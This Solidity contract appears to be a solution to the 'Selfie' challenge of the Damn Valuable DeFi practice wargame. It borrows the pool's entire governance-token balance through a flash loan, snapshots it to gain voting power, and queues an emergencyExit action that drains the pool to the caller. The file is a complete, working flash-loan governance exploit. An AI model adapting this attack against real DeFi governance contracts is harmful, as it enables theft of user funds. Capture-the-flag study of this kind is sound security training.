// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {

    SelfiePool pool;
    ISimpleGovernance simgov;
    DamnValuableTokenSnapshot dvt;
    uint256 actionId;

    function exploit(
        SelfiePool _pool,
        ISimpleGovernance _simgov,
        DamnValuableTokenSnapshot _dvt
    )  external {
        simgov = _simgov;
        pool = _pool;
        dvt = _dvt;
        dvt.snapshot();
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_dvt), _dvt.balanceOf(address(pool)), "");
    }

    function onFlashLoan(address, address _token,uint256 _amount, uint256, bytes calldata) external override returns (bytes32) {
        dvt.snapshot();
        actionId = simgov.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", tx.origin)
        );
        DamnValuableTokenSnapshot(_token).approve(address(pool), _amount);  
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function excuteAction() external {
        simgov.executeAction(actionId);
    }
}